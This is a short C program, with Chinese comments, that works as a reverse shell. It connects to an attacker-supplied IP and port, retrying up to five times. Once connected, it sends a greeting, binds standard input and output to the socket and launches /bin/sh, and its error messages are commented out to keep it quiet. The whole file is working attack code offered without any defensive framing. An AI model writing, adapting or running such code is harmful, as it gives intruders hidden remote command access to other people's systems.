#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <netdb.h>

void usage();
char shell[] = "/bin/sh";
char message[] = "hi cxaqhq \n";
int sock;
int a = 0;

int main(int argc, char *argv[])
{
	if (argc < 3)
	{
		usage(argv[0]);
	}

	// 重连次数
	while (a < 5)
	{
		a ++;
		struct sockaddr_in server;
		if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		{
			// 创建Socket 失败
			// printf("Couldn't make socket!n");
			sleep(10);// 滞停3s
			continue;
		}

		server.sin_family = AF_INET;
		server.sin_port = htons(atoi(argv[2]));
		server.sin_addr.s_addr = inet_addr(argv[1]);

		if (connect(sock, (struct sockaddr *)&server, sizeof(struct sockaddr)) == -1)
		{
			// 远程连接失败
			// printf("Could not connect to remote shell!n");
			sleep(10);// 滞停3s
			continue;
		}
		send(sock, message, sizeof(message), 0);
		dup2(sock, 0);
		dup2(sock, 1);
		dup2(sock, 2);
		execl(shell, "/bin/sh", (char *)0);
		close(sock);
		return 1;

	}
	
}
void usage(char *prog[])
{
	// 提示使用方法  
	// printf("Usage: %s <reflect ip> <port>\n", prog);
	exit(-1);
}
